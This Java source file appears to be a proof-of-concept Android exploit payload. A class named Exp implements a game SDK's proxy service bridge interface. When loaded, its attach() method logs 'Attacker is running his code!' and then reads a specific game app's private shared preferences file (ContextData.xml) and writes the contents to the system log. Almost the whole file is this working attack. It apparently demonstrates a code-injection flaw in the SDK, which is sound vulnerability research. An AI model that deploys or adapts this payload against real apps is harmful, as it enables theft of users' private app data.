package cn.ninegame.gamesdk.demo;

import android.app.Service;
import android.content.Intent;
import android.content.res.Configuration;
import android.net.Uri;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

import java.io.FileInputStream;

import cn.gundam.sdk.shell.bridge.IProxyServiceBridge;

public class Exp implements IProxyServiceBridge {
    private static final String TAG = "Exp";

    public Exp(Bundle b){
        Log.e(TAG, "Exp constructed");
    }

    public void attach(Service arg1){
        Log.d(TAG, "Attacker is running his code!");
        try {
            StringBuffer stringBuffer = new StringBuffer();
            FileInputStream fileInputStream = new FileInputStream("/data/data/com.mfkj.jysq.aligames/shared_prefs/ContextData.xml");
            byte[] buffer = new byte[1024];
            int len = fileInputStream.read(buffer);
            while (len > 0) {
                stringBuffer.append(new String(buffer, 0, len));
                len = fileInputStream.read(buffer);
            }
            fileInputStream.close();
            Log.d(TAG, stringBuffer.toString());
        }catch(Exception e) {
            Log.e(TAG, Log.getStackTraceString(e));
        }
    }

    public IBinder onBind(Intent arg1){
        return new Binder();
    }

    public void onConfigurationChanged(Configuration arg1){

    }

    public void onDestroy(){

    }

    public void onLowMemory(){

    }

    public void onRebind(Intent arg1){

    }

    public int onStartCommand(Intent arg1, int arg2, int arg3){
        return 1;
    }

    public void onTaskRemoved(Intent arg1){

    }

    public void onTrimMemory(int arg1){

    }

    public boolean onUnbind(Intent arg1){
        return true;
    }
}
